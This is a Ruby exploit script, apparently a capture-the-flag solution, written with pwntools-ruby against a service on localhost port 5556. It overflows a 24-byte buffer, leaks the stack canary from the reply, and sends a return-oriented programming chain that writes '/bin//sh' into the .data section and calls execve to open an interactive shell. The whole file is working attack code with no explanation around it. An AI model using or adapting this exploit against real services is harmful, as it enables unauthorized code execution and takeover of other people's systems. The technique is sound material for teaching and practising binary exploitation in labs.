#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pwn'        # https://github.com/peter50216/pwntools-ruby

STDIN.sync = 0
STDOUT.sync = 0

context.arch = 'amd64'

z = Sock.new 'localhost', 5556

def ropchain()
    p = ""
    p += p64( 0x00000000004017f7) # pop rsi ; ret                                                             
    p += p64( 0x00000000006cc080) # @ .data                                                                   
    p += p64( 0x000000000047a6e6) # pop rax ; pop rdx ; pop rbx ; ret                                         
    p += '/bin//sh'                                                                                           
    p += p64( 0x4141414141414141) # padding                                                                   
    p += p64( 0x4141414141414141) # padding                                                                   
    p += p64( 0x0000000000475fc1) # mov qword ptr [rsi], rax ; ret                                            
    p += p64( 0x00000000004017f7) # pop rsi ; ret                                                             
    p += p64( 0x00000000006cc088) # @ .data + 8                                                               
    p += p64( 0x000000000042732f) # xor rax, rax ; ret                                                        
    p += p64( 0x0000000000475fc1) # mov qword ptr [rsi], rax ; ret                                            
    p += p64( 0x00000000004005d5) # pop rdi ; ret                                                             
    p += p64( 0x00000000006cc080) # @ .data                                                                   
    p += p64( 0x00000000004017f7) # pop rsi ; ret                                                             
    p += p64( 0x00000000006cc088) # @ .data + 8                                                               
    p += p64( 0x0000000000443776) # pop rdx ; ret                                                             
    p += p64( 0x00000000006cc088) # @ .data + 8                                                               
    p += p64( 0x000000000047a6e6) # pop rax; pop rdx; pop rbx ; ret                                           
    p += p64( 0x000000000000003b) # 0x3b -> execve                                                            
    p += p64( 0x00000000006cc088) # @ .data + 8                                                               
    p += p64( 0x00000000006cc088) # @ .data + 8                                                               
    p += p64( 0x00000000004003fc) # syscall
    return p
end

payload = "a"*24

z.sendline payload

x = z.recv()

cookie = u64("\x00"+x[25,1000][0,7])

z.sendline (payload + p64(cookie) + p64(0) + ropchain())

puts z.recv()

z.sendline('exit')

z.interact

